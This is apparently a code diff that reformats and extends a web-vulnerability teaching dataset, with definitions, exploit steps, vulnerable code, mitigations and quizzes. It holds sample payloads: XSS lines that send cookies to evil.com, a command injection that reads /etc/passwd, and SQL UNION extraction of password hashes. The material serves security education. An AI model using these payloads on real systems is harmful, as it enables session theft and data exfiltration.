@@ -19,7 +19,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which internal IP is most commonly targeted in AWS SSRF attacks?",
-        "options": ["127.0.0.1", "169.254.169.254", "10.0.0.1", "192.168.1.1"],
+        "options": [
+          "127.0.0.1",
+          "169.254.169.254",
+          "10.0.0.1",
+          "192.168.1.1"
+        ],
         "answer": 1
       },
       {
@@ -70,12 +75,22 @@ module.exports = [
     "quizzes": [
       {
         "question": "What must be enabled in an XML parser for XXE to work?",
-        "options": ["JSON parsing", "DTD / external entity processing", "HTTPS", "Cookies"],
+        "options": [
+          "JSON parsing",
+          "DTD / external entity processing",
+          "HTTPS",
+          "Cookies"
+        ],
         "answer": 1
       },
       {
         "question": "Besides reading local files, what other major attack can XXE be used to launch?",
-        "options": ["SSRF, via SYSTEM identifiers pointing to internal URLs", "SQL injection", "Buffer overflow", "Clickjacking"],
+        "options": [
+          "SSRF, via SYSTEM identifiers pointing to internal URLs",
+          "SQL injection",
+          "Buffer overflow",
+          "Clickjacking"
+        ],
         "answer": 0
       },
       {
@@ -106,7 +121,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which tool generates Java deserialization gadget chains?",
-        "options": ["sqlmap", "ysoserial", "Burp", "nmap"],
+        "options": [
+          "sqlmap",
+          "ysoserial",
+          "Burp",
+          "nmap"
+        ],
         "answer": 1
       },
       {
@@ -147,7 +167,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which payload is a classic SSTI detection probe?",
-        "options": ["{{7*7}}", "' OR 1=1--", "<script>alert(1)</script>", "../../etc/passwd"],
+        "options": [
+          "{{7*7}}",
+          "' OR 1=1--",
+          "<script>alert(1)</script>",
+          "../../etc/passwd"
+        ],
         "answer": 0
       },
       {
@@ -188,7 +213,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which cookie attribute best mitigates CSRF?",
-        "options": ["HttpOnly", "Secure", "SameSite=Strict", "Domain"],
+        "options": [
+          "HttpOnly",
+          "Secure",
+          "SameSite=Strict",
+          "Domain"
+        ],
         "answer": 2
       },
       {
@@ -229,7 +259,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "What sequence is the hallmark of path traversal?",
-        "options": ["&&", "../", "<>", "%00 only"],
+        "options": [
+          "&&",
+          "../",
+          "<>",
+          "%00 only"
+        ],
         "answer": 1
       },
       {
@@ -270,17 +305,32 @@ module.exports = [
     "quizzes": [
       {
         "question": "LFI can escalate to RCE through which technique?",
-        "options": ["Log poisoning", "DNS spoofing", "ARP poisoning", "Phishing"],
+        "options": [
+          "Log poisoning",
+          "DNS spoofing",
+          "ARP poisoning",
+          "Phishing"
+        ],
         "answer": 0
       },
       {
         "question": "What PHP wrapper is commonly used in LFI to read source code as base64 instead of executing it?",
-        "options": ["php://filter/convert.base64-encode/resource=", "http://", "ftp://", "data://text/plain"],
+        "options": [
+          "php://filter/convert.base64-encode/resource=",
+          "http://",
+          "ftp://",
+          "data://text/plain"
+        ],
         "answer": 0
       },
       {
         "question": "Which configuration setting, if disabled, helps prevent LFI from escalating via remote wrappers?",
-        "options": ["allow_url_include", "display_errors", "memory_limit", "max_execution_time"],
+        "options": [
+          "allow_url_include",
+          "display_errors",
+          "memory_limit",
+          "max_execution_time"
+        ],
         "answer": 0
       }
     ]
@@ -301,12 +351,22 @@ module.exports = [
     "quizzes": [
       {
         "question": "RFI includes files from where (vs LFI)?",
-        "options": ["The local disk", "A remote attacker-controlled server", "The database", "Memory"],
+        "options": [
+          "The local disk",
+          "A remote attacker-controlled server",
+          "The database",
+          "Memory"
+        ],
         "answer": 1
       },
       {
         "question": "Which PHP setting must typically be enabled for classic RFI to work?",
-        "options": ["allow_url_include", "short_open_tag", "error_reporting", "session.gc_maxlifetime"],
+        "options": [
+          "allow_url_include",
+          "short_open_tag",
+          "error_reporting",
+          "session.gc_maxlifetime"
+        ],
         "answer": 0
       },
       {
@@ -337,7 +397,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Open redirects are most commonly abused for?",
-        "options": ["Phishing / token theft", "Buffer overflow", "Race condition", "DoS"],
+        "options": [
+          "Phishing / token theft",
+          "Buffer overflow",
+          "Race condition",
+          "DoS"
+        ],
         "answer": 0
       },
       {
@@ -378,12 +443,22 @@ module.exports = [
     "quizzes": [
       {
         "question": "Race conditions exploit the gap between which two events?",
-        "options": ["Login and logout", "Check and use (TOCTOU)", "Request and response", "DNS and TCP"],
+        "options": [
+          "Login and logout",
+          "Check and use (TOCTOU)",
+          "Request and response",
+          "DNS and TCP"
+        ],
         "answer": 1
       },
       {
         "question": "What tool/technique is commonly used to fire many requests at nearly the same instant to exploit a race condition?",
-        "options": ["Turbo Intruder / single-packet attack", "sqlmap", "nikto", "John the Ripper"],
+        "options": [
+          "Turbo Intruder / single-packet attack",
+          "sqlmap",
+          "nikto",
+          "John the Ripper"
+        ],
         "answer": 0
       },
       {
@@ -414,7 +489,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Why are business logic flaws hard for scanners?",
-        "options": ["They require understanding intended behavior", "They use encryption", "They are network-only", "They need root"],
+        "options": [
+          "They require understanding intended behavior",
+          "They use encryption",
+          "They are network-only",
+          "They need root"
+        ],
         "answer": 0
       },
       {
@@ -455,7 +535,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Subdomain takeover exploits a dangling what?",
-        "options": ["TCP port", "DNS CNAME record", "Cookie", "JWT"],
+        "options": [
+          "TCP port",
+          "DNS CNAME record",
+          "Cookie",
+          "JWT"
+        ],
         "answer": 1
       },
       {
@@ -496,7 +581,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which JWT algorithm setting is dangerous if accepted?",
-        "options": ["RS256", "none", "ES256", "HS512"],
+        "options": [
+          "RS256",
+          "none",
+          "ES256",
+          "HS512"
+        ],
         "answer": 1
       },
       {
@@ -537,7 +627,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which header prevents clickjacking?",
-        "options": ["X-Frame-Options", "Content-Type", "Cache-Control", "ETag"],
+        "options": [
+          "X-Frame-Options",
+          "Content-Type",
+          "Cache-Control",
+          "ETag"
+        ],
         "answer": 0
       },
       {
@@ -552,7 +647,12 @@ module.exports = [
       },
       {
         "question": "Besides X-Frame-Options, which modern CSP directive also defends against clickjacking?",
-        "options": ["frame-ancestors", "script-src", "default-src", "img-src"],
+        "options": [
+          "frame-ancestors",
+          "script-src",
+          "default-src",
+          "img-src"
+        ],
         "answer": 0
       }
     ]
@@ -573,7 +673,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Dangerous CORS combo reflects Origin together with what?",
-        "options": ["Allow-Credentials: true", "HttpOnly", "Cache-Control", "Gzip"],
+        "options": [
+          "Allow-Credentials: true",
+          "HttpOnly",
+          "Cache-Control",
+          "Gzip"
+        ],
         "answer": 0
       },
       {
@@ -614,12 +719,22 @@ module.exports = [
     "quizzes": [
       {
         "question": "Request smuggling abuses disagreement between which headers?",
-        "options": ["Host & Referer", "Content-Length & Transfer-Encoding", "Cookie & Origin", "Accept & ETag"],
+        "options": [
+          "Host & Referer",
+          "Content-Length & Transfer-Encoding",
+          "Cookie & Origin",
+          "Accept & ETag"
+        ],
         "answer": 1
       },
       {
         "question": "In a 'CL.TE' smuggling attack, which component trusts the Content-Length header?",
-        "options": ["The front-end proxy", "The back-end server", "Both equally", "Neither"],
+        "options": [
+          "The front-end proxy",
+          "The back-end server",
+          "Both equally",
+          "Neither"
+        ],
         "answer": 0
       },
       {
@@ -650,7 +765,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Mass assignment lets attackers set which fields?",
-        "options": ["Only public fields", "Unintended sensitive fields like isAdmin", "CSS styles", "DNS records"],
+        "options": [
+          "Only public fields",
+          "Unintended sensitive fields like isAdmin",
+          "CSS styles",
+          "DNS records"
+        ],
         "answer": 1
       },
       {
@@ -691,7 +811,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which key is central to prototype pollution?",
-        "options": ["__proto__", "self", "this", "window"],
+        "options": [
+          "__proto__",
+          "self",
+          "this",
+          "window"
+        ],
         "answer": 0
       },
       {
@@ -732,7 +857,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "SSI injection executes directives like:",
-        "options": ["<!--#exec cmd=...-->", "<script>", "SELECT *", "${jndi}"],
+        "options": [
+          "<!--#exec cmd=...-->",
+          "<script>",
+          "SELECT *",
+          "${jndi}"
+        ],
         "answer": 0
       },
       {
@@ -773,7 +903,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which character is heavily abused in LDAP injection?",
-        "options": ["*", "@", "#", "~"],
+        "options": [
+          "*",
+          "@",
+          "#",
+          "~"
+        ],
         "answer": 0
       },
       {
@@ -814,7 +949,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which MongoDB operator is abused to bypass login?",
-        "options": ["$ne", "$pull", "$inc", "$set"],
+        "options": [
+          "$ne",
+          "$pull",
+          "$inc",
+          "$set"
+        ],
         "answer": 0
       },
       {
@@ -855,7 +995,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "A safe practice for uploads is to store files where?",
-        "options": ["Inside the web root", "Outside the web root / non-executable dir", "In /etc", "In cookies"],
+        "options": [
+          "Inside the web root",
+          "Outside the web root / non-executable dir",
+          "In /etc",
+          "In cookies"
+        ],
         "answer": 1
       },
       {
@@ -896,7 +1041,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Host header injection is often chained with which feature?",
-        "options": ["Password reset links", "CSS rendering", "Image resizing", "Logging"],
+        "options": [
+          "Password reset links",
+          "CSS rendering",
+          "Image resizing",
+          "Logging"
+        ],
         "answer": 0
       },
       {
@@ -937,7 +1087,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Cache poisoning exploits which type of input?",
-        "options": ["Unkeyed inputs", "Encrypted inputs", "Compressed inputs", "Signed inputs"],
+        "options": [
+          "Unkeyed inputs",
+          "Encrypted inputs",
+          "Compressed inputs",
+          "Signed inputs"
+        ],
         "answer": 0
       },
       {
@@ -978,7 +1133,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which parameter prevents CSRF in OAuth flows?",
-        "options": ["scope", "state", "client_id", "grant_type"],
+        "options": [
+          "scope",
+          "state",
+          "client_id",
+          "grant_type"
+        ],
         "answer": 1
       },
       {
@@ -1019,7 +1179,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which GraphQL feature leaks the entire API schema?",
-        "options": ["Mutations", "Introspection", "Subscriptions", "Fragments"],
+        "options": [
+          "Mutations",
+          "Introspection",
+          "Subscriptions",
+          "Fragments"
+        ],
         "answer": 1
       },
       {
@@ -1060,7 +1225,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Web cache deception abuses fake what?",
-        "options": ["Static file extensions", "TCP ports", "DNS records", "JWT claims"],
+        "options": [
+          "Static file extensions",
+          "TCP ports",
+          "DNS records",
+          "JWT claims"
+        ],
         "answer": 0
       },
       {
@@ -1101,7 +1271,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "BOLA is ranked #1 in which list?",
-        "options": ["OWASP API Top 10", "CWE Top 5", "NIST 800-53", "PCI DSS"],
+        "options": [
+          "OWASP API Top 10",
+          "CWE Top 5",
+          "NIST 800-53",
+          "PCI DSS"
+        ],
         "answer": 0
       },
       {
@@ -1142,7 +1317,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Dependency confusion is a type of what attack?",
-        "options": ["Supply chain attack", "DoS", "MITM", "Phishing"],
+        "options": [
+          "Supply chain attack",
+          "DoS",
+          "MITM",
+          "Phishing"
+        ],
         "answer": 0
       },
       {
@@ -1183,7 +1363,12 @@ module.exports = [
     "quizzes": [
       {
         "question": "Which payload indicates a Log4Shell attempt?",
-        "options": ["${jndi:ldap://...}", "' OR 1=1", "<img onerror>", "../../"],
+        "options": [
+          "${jndi:ldap://...}",
+          "' OR 1=1",
+          "<img onerror>",
+          "../../"
+        ],
         "answer": 0
       },
       {
@@ -1224,12 +1409,22 @@ module.exports = [
     "quizzes": [
       {
         "question": "Buffer overflows typically aim to overwrite which value?",
-        "options": ["The return address (EIP/RIP)", "The cookie", "The DNS cache", "The CSS"],
+        "options": [
+          "The return address (EIP/RIP)",
+          "The cookie",
+          "The DNS cache",
+          "The CSS"
+        ],
         "answer": 0
       },
       {
         "question": "Which C function is a classic source of buffer overflow bugs because it performs no bounds checking?",
-        "options": ["strcpy", "snprintf", "strlcpy", "memset"],
+        "options": [
+          "strcpy",
+          "snprintf",
+          "strlcpy",
+          "memset"
+        ],
         "answer": 0
       },
       {
@@ -1249,6 +1444,1340 @@ module.exports = [
           "Increasing buffer size arbitrarily",
           "Disabling logging",
           "Using shorter passwords"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "SQL Injection",
+    "category": "Injection",
+    "severity": "Critical",
+    "definition": "Untrusted input is concatenated into a SQL query, letting an attacker alter the query's logic to read, modify, or delete database data.",
+    "theory": "When user input is inserted directly into a SQL string instead of being passed as a parameter, attackers can break out of the intended data context and inject their own SQL keywords/operators, bypassing authentication or extracting entire tables.",
+    "cve": "CVE-2019-3396 (Atlassian Confluence)",
+    "exploit": "1. Find a param reflected in a query (?id=5).\n2. Test with id=5' OR '1'='1.\n3. If behavior changes, use UNION SELECT to extract data from other tables.\n4. Use sqlmap to automate extraction.",
+    "example": {
+      "scenario": "A product search page builds its SQL query by directly concatenating the search term, letting an attacker bypass the query entirely and dump the entire users table including password hashes.",
+      "code": "// Vulnerable Node.js code\nconst query = `SELECT * FROM products WHERE name = '${req.query.q}'`;\ndb.query(query);\n\n// Attacker input\n?q=' UNION SELECT username, password_hash FROM users--"
+    },
+    "mitigation": "Use parameterized queries / prepared statements; never concatenate input into SQL; least-privilege DB accounts.",
+    "quizzes": [
+      {
+        "question": "What is the most effective defense against SQL injection?",
+        "options": [
+          "Parameterized queries / prepared statements",
+          "Minifying JavaScript",
+          "Using HTTPS",
+          "Adding a CAPTCHA"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which classic payload is used to test for SQL injection in a login form?",
+        "options": [
+          "' OR '1'='1",
+          "{{7*7}}",
+          "../../etc/passwd",
+          "<script>alert(1)</script>"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What SQL clause is commonly used to extract data from other tables once injection is confirmed?",
+        "options": [
+          "UNION SELECT",
+          "GROUP BY",
+          "ORDER BY",
+          "LIMIT"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Command Injection (OS Command Injection)",
+    "category": "Injection",
+    "severity": "Critical",
+    "definition": "Untrusted input is passed to a system shell, letting an attacker execute arbitrary operating system commands.",
+    "theory": "Apps that build shell commands from user input (e.g. calling ping, convert, or grep with a filename) allow attackers to append shell metacharacters (;, |, &&) to chain additional commands.",
+    "cve": "CVE-2021-22205 (GitLab ExifTool)",
+    "exploit": "1. Find a feature that shells out (e.g. ping a host, convert a file).\n2. Append a metacharacter: 127.0.0.1; whoami.\n3. Server executes both commands and may reflect output.",
+    "example": {
+      "scenario": "A network diagnostics tool lets users 'ping' a hostname, but passes the input straight into a shell command, letting an attacker chain on an arbitrary command after a semicolon.",
+      "code": "// Vulnerable Node.js code\nconst { exec } = require('child_process');\nexec(`ping -c 4 ${req.query.host}`, (err, stdout) => res.send(stdout));\n\n// Attacker input\n?host=127.0.0.1; cat /etc/passwd"
+    },
+    "mitigation": "Avoid shelling out with user input; use safe APIs (execFile with an argument array), strict allowlisting.",
+    "quizzes": [
+      {
+        "question": "Which shell metacharacter is commonly used to chain a second command in command injection?",
+        "options": [
+          ";",
+          "%",
+          "#",
+          "@"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the safest way to call an external command with user-supplied arguments?",
+        "options": [
+          "Use an API that takes arguments as an array (e.g. execFile) instead of building a shell string",
+          "Always run commands as root",
+          "Use a longer timeout",
+          "Encode the input in base64"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is command injection often rated more severe than many injection types?",
+        "options": [
+          "It can grant direct control of the underlying operating system, not just the application data layer",
+          "It only affects logging",
+          "It cannot be automated",
+          "It requires physical access"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Reflected Cross-Site Scripting (XSS)",
+    "category": "Injection",
+    "severity": "High",
+    "definition": "User input is echoed back into a page's HTML/JS without sanitization, executing attacker-controlled script in the victim's browser.",
+    "theory": "Reflected XSS occurs when input from the current request (URL param, form field) is immediately reflected into the response without encoding, so a crafted link executes script the moment the victim clicks it.",
+    "cve": "CVE-2020-11022 (jQuery)",
+    "exploit": "1. Find a param reflected in the page (?name=Het).\n2. Test ?name=<script>alert(1)</script>.\n3. If it executes, craft a link that steals cookies: <script>fetch('//evil.com?c='+document.cookie)</script>.",
+    "example": {
+      "scenario": "A search results page echoes back 'No results for: <query>' without escaping it, so a phishing link containing a script tag as the query steals the victim's session cookie the moment they click it.",
+      "code": "// Vulnerable server code\nres.send(`<p>No results for: ${req.query.q}</p>`); // unescaped\n\n// Phishing link sent to victim\nhttps://shop.com/search?q=<script>fetch('//evil.com/steal?c='+document.cookie)</script>"
+    },
+    "mitigation": "Context-aware output encoding, Content-Security-Policy, HttpOnly cookies.",
+    "quizzes": [
+      {
+        "question": "Reflected XSS executes script from which source?",
+        "options": [
+          "The current request's input, immediately reflected back",
+          "Data stored permanently in the database",
+          "A separate malicious server",
+          "The browser's cache"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What is the primary defense against reflected XSS?",
+        "options": [
+          "Context-aware output encoding of all user input before rendering",
+          "Using a faster server",
+          "Disabling cookies entirely",
+          "Adding rate limiting"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which cookie attribute limits the damage of XSS by preventing JavaScript from reading the cookie?",
+        "options": [
+          "HttpOnly",
+          "Secure",
+          "Path",
+          "Domain"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Stored Cross-Site Scripting (XSS)",
+    "category": "Injection",
+    "severity": "Critical",
+    "definition": "Malicious script is saved on the server (e.g. in a comment or profile field) and executes for every user who later views that content.",
+    "theory": "Unlike reflected XSS, stored XSS persists in the database. Any visitor viewing the infected page — not just the one who submitted it — runs the attacker's script, making it far more impactful (e.g. mass account takeover via an admin panel).",
+    "cve": "CVE-2022-29464 (WSO2)",
+    "exploit": "1. Submit a comment containing <script>...</script>.\n2. If stored and rendered unescaped, every visitor who views that page executes it.\n3. Target an admin-viewed page (support tickets, user reports) to escalate to admin account takeover.",
+    "example": {
+      "scenario": "An attacker posts a product review containing a script tag; the review is stored as-is and rendered on the public product page, so every visitor — including store admins reviewing flagged comments — has their session cookie silently exfiltrated.",
+      "code": "// Attacker-submitted review (stored verbatim in DB)\n{ \"review\": \"Great product! <script>fetch('//evil.com/c?d='+document.cookie)</script>\" }\n\n// Vulnerable rendering on the product page\n<div class=\"review\">${review.text}</div>  <!-- rendered without escaping -->"
+    },
+    "mitigation": "Escape output on render (not just on input), sanitize HTML with an allowlist library, CSP.",
+    "quizzes": [
+      {
+        "question": "Why is stored XSS generally more dangerous than reflected XSS?",
+        "options": [
+          "It executes for every user who views the infected content, not just one tricked victim",
+          "It only works on mobile browsers",
+          "It bypasses TLS",
+          "It cannot be detected by any scanner"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Where should output encoding be applied to reliably prevent stored XSS?",
+        "options": [
+          "At render/output time, not just at input validation time",
+          "Only in the database layer",
+          "Only in the URL",
+          "Only on the login page"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a common high-value target for stored XSS payloads?",
+        "options": [
+          "Admin-viewed pages like support tickets or flagged content, to escalate to admin takeover",
+          "The favicon",
+          "The robots.txt file",
+          "The DNS TTL"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "DOM-Based Cross-Site Scripting (XSS)",
+    "category": "Client-Side",
+    "severity": "High",
+    "definition": "Client-side JavaScript writes attacker-controlled data into the DOM via an unsafe sink, without the payload ever touching the server.",
+    "theory": "DOM XSS happens entirely in the browser: a 'source' (like location.hash or document.URL) is read and passed to a dangerous 'sink' (like innerHTML or eval) without sanitization, so the server-side code may look perfectly safe while the page is still exploitable.",
+    "cve": "CVE-2020-6519 (Chromium CSP bypass enabling DOM XSS)",
+    "exploit": "1. Find JS that reads location.hash or similar and writes to innerHTML.\n2. Craft a URL: page.html#<img src=x onerror=alert(1)>.\n3. Victim clicks the link; the client-side script executes the payload without any server round-trip.",
+    "example": {
+      "scenario": "A single-page app reads a 'welcome name' from the URL fragment and injects it directly into the page via innerHTML; because the fragment never reaches the server, traditional server-side XSS filters never see the payload at all.",
+      "code": "// Vulnerable client-side JS\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Welcome, ' + name;\n\n// Malicious link sent to victim\nhttps://app.com/#<img src=x onerror=\"fetch('//evil.com?c='+document.cookie)\">"
+    },
+    "mitigation": "Avoid unsafe sinks (innerHTML, eval); use textContent or a sanitizer library; CSP.",
+    "quizzes": [
+      {
+        "question": "What makes DOM-based XSS different from reflected/stored XSS?",
+        "options": [
+          "The malicious data flows entirely within client-side JavaScript and never touches the server",
+          "It only affects Internet Explorer",
+          "It requires admin privileges",
+          "It only works over HTTP, not HTTPS"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Which of these is considered a dangerous DOM 'sink'?",
+        "options": [
+          "innerHTML",
+          "textContent",
+          "console.log",
+          "Array.map"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why might a server-side XSS filter completely miss a DOM XSS payload?",
+        "options": [
+          "Data passed via the URL fragment (#) is never sent to the server in the HTTP request",
+          "DOM XSS payloads are always encrypted",
+          "Server-side filters only check POST requests",
+          "DOM XSS only happens on the first page load"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Insecure Direct Object Reference (IDOR)",
+    "category": "Access Control",
+    "severity": "High",
+    "definition": "An application exposes a direct reference to an internal object (a file, record, or key) that a user can manipulate to access data belonging to someone else.",
+    "theory": "IDOR is the classic, broader form of horizontal access-control failure: any place a raw identifier (filename, DB key, account number) is exposed to the client and used server-side without an ownership check is exploitable, not just REST API endpoints.",
+    "cve": "CVE-2019-7644 (Ring doorbell IDOR)",
+    "exploit": "1. Perform a normal action and note the object reference (e.g. invoice_id=4471, or filename user_4471.pdf).\n2. Change the reference to a neighboring value.\n3. If the server returns another user's data, ownership checks are missing.",
+    "example": {
+      "scenario": "A medical portal lets patients download their lab report via a direct link containing a sequential report ID; an attacker simply edits the number in the URL to read other patients' lab results.",
+      "code": "// Vulnerable download endpoint\napp.get('/reports/:id/download', requireAuth, (req, res) => {\n  res.sendFile(`/reports/${req.params.id}.pdf`); // no check that req.user owns this report\n});\n\n// Attacker simply changes the ID\nGET /reports/40872/download   (while authenticated as the owner of report 40871)"
+    },
+    "mitigation": "Enforce server-side ownership checks on every object access; use unguessable, unpredictable identifiers as a defense-in-depth layer.",
+    "quizzes": [
+      {
+        "question": "IDOR vulnerabilities arise because the server fails to check what?",
+        "options": [
+          "That the requesting user actually owns or is authorized to access the referenced object",
+          "That the password is strong enough",
+          "That the TLS certificate is valid",
+          "That the request uses POST instead of GET"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Besides API endpoints, where else can IDOR commonly appear?",
+        "options": [
+          "Direct file/document download links using sequential or guessable identifiers",
+          "CSS stylesheets",
+          "DNS records",
+          "Favicon requests"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Using random, unguessable IDs instead of sequential ones is best described as:",
+        "options": [
+          "A defense-in-depth measure, not a substitute for proper authorization checks",
+          "A complete fix that makes authorization checks unnecessary",
+          "Something that has no security benefit at all",
+          "Only relevant for encryption, not access control"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Broken Function Level Authorization",
+    "category": "Access Control",
+    "severity": "Critical",
+    "definition": "An API or app fails to verify that a user's role permits calling a particular function/endpoint, letting low-privileged users invoke admin-only actions.",
+    "theory": "Unlike BOLA (object-level), this flaw is about the function/action itself — e.g. a regular user discovering and successfully calling DELETE /api/admin/users/{id} because the server never checks the caller's role for that route, only that they're logged in.",
+    "cve": "OWASP API Security Top 10 — API5:2023",
+    "exploit": "1. Map out admin-only endpoints (via JS source, API docs, or guesswork).\n2. Call them directly as a low-privileged authenticated user.\n3. If the server only checks 'is logged in' and not 'is admin', the action succeeds.",
+    "example": {
+      "scenario": "A SaaS dashboard hides the 'Delete Organization' button from regular users in the UI, but the underlying API endpoint never actually checks the caller's role — so a regular user can call it directly with a tool like curl and delete the entire organization.",
+      "code": "// Vulnerable endpoint — checks login, not role\napp.delete('/api/org/:id', requireAuth, async (req, res) => {\n  await db.query('DELETE FROM organizations WHERE id=$1', [req.params.id]); // no role check!\n  res.json({ ok: true });\n});\n\n// Low-privileged user calls it directly, bypassing the UI entirely\ncurl -X DELETE https://app.com/api/org/55 -H \"Authorization: Bearer <regular-user-token>\""
+    },
+    "mitigation": "Enforce role/permission checks server-side on every sensitive endpoint, never rely on hiding UI elements alone.",
+    "quizzes": [
+      {
+        "question": "Broken Function Level Authorization is primarily about checking what?",
+        "options": [
+          "Whether the user's role permits calling a specific action/endpoint",
+          "Whether the user owns a specific object",
+          "Whether the password meets complexity rules",
+          "Whether the session has expired"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is hiding an admin button in the UI not sufficient protection?",
+        "options": [
+          "The underlying API endpoint can still be called directly, bypassing the UI entirely",
+          "UI elements are encrypted",
+          "Browsers block hidden buttons from being clicked",
+          "Hiding a button changes the server's authorization logic automatically"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the correct fix for broken function level authorization?",
+        "options": [
+          "Enforce explicit role/permission checks on the server for every sensitive endpoint",
+          "Rename the endpoint to something harder to guess",
+          "Add more CSS to hide the feature",
+          "Increase the session timeout"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Vertical & Horizontal Privilege Escalation",
+    "category": "Access Control",
+    "severity": "Critical",
+    "definition": "An attacker gains access to functionality or data beyond their assigned privilege level — either by becoming a higher-privileged role (vertical) or by accessing another same-level user's resources (horizontal).",
+    "theory": "Privilege escalation is the umbrella outcome of many flaws (mass assignment, BOLA, broken function-level auth). Vertical escalation = user becomes admin; horizontal escalation = user A accesses user B's data without becoming a different role.",
+    "cve": "CVE-2021-3156 (Sudo Baron Samedit — vertical privilege escalation)",
+    "exploit": "1. Identify a parameter or token claim tied to role/identity (role=user, user_id=441).\n2. Modify it directly (role=admin) or via a parallel flaw like mass assignment.\n3. Confirm elevated access by attempting an admin-only or another-user-only action.",
+    "example": {
+      "scenario": "A SaaS app's JWT includes the user's role as a plain claim that's never re-verified against the database server-side; an attacker decodes their token, changes 'role':'user' to 'role':'admin', re-signs it (or exploits a JWT flaw), and gains full administrative access.",
+      "code": "// Original JWT payload\n{ \"sub\": \"user_441\", \"role\": \"user\" }\n\n// Tampered JWT payload (after exploiting a signature weakness, e.g. alg:none)\n{ \"sub\": \"user_441\", \"role\": \"admin\" }\n\n// Server trusts the role claim directly without re-checking the database\nif (decodedToken.role === 'admin') { /* grant admin access */ }"
+    },
+    "mitigation": "Re-verify role/permissions server-side from a trusted source on every request; never trust client-supplied role claims alone.",
+    "quizzes": [
+      {
+        "question": "What distinguishes vertical from horizontal privilege escalation?",
+        "options": [
+          "Vertical means gaining a higher role; horizontal means accessing another same-level user's data",
+          "Vertical only happens in mobile apps; horizontal only in web apps",
+          "Vertical is always less severe than horizontal",
+          "They are the same thing with different names"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "Why is trusting a role claim inside a JWT without server-side re-verification risky?",
+        "options": [
+          "If the token can be tampered with or forged, the attacker can simply claim a higher role",
+          "JWTs cannot contain role information",
+          "JWTs are always encrypted and unreadable",
+          "This is never risky if HTTPS is used"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's a reliable defense against privilege escalation via tampered claims?",
+        "options": [
+          "Re-check the user's actual role/permissions against a trusted server-side source on every sensitive action",
+          "Make the JWT longer",
+          "Store the JWT in a cookie instead of localStorage",
+          "Reduce the token expiry to 1 second"
+        ],
+        "answer": 0
+      }
+    ]
+  },
+  {
+    "name": "Session Fixation",
+    "category": "Auth & Session",
+    "severity": "Medium",
+    "definition": "An attacker sets or predicts a victim's session ID before login, so once the victim authenticates, the attacker's known session ID becomes a valid authenticated session.",
+    "theory": "If an app doesn't regenerate the session ID upon successful login, an attacker can plant a known session token on the victim (via a link or cookie injection) and simply wait for them to log in, then reuse that same session ID to hijack the now-authenticated session.",
+    "cve": "CVE-2014-6394 (Apache Tomcat session fixation)",
+    "exploit": "1. Obtain a valid (unauthenticated) session ID from the target site.\n2. Send the victim a link embedding that session ID (?sessionid=ATTACKERKNOWN123).\n3. Victim logs in using that session.\n4. Attacker reuses the same session ID, now authenticated as the victim.",
+    "example": {
+      "scenario": "A site accepts a session ID via URL parameter and never issues a new one after login; an attacker sends a victim a link containing a session ID they already know, waits for the victim to log in through that link, then uses the same ID themselves to access the now-authenticated account.",
+      "code": "// Vulnerable: app accepts attacker-supplied session ID and never regenerates it after login\napp.get('/login', (req, res) => {\n  if (req.query.sessionid) req.session.id = req.query.sessionid; // attacker-controlled!\n});\n// After successful login, the session ID is NOT regenerated\n\n// Phishing link sent to victim\nhttps://app.com/login?sessionid=ATTACKERKNOWN123"
+    },
+    "mitigation": "Regenerate the session ID immediately after successful authentication; never accept session IDs from URL parameters.",
+    "quizzes": [
+      {
+        "question": "Session fixation relies on the attacker doing what before the victim logs in?",
+        "options": [
+          "Planting or predicting a known session ID on the victim",
+          "Stealing the victim's password",
+          "Intercepting TLS traffic",
+          "Sending a malicious file attachment"
+        ],
+        "answer": 0
+      },
+      {
+        "question": "What's the key server-side fix for session fixation?",
+        "options": [
+          "Regenerate the session ID immediately after successful login",
+          "Use longer passwords",
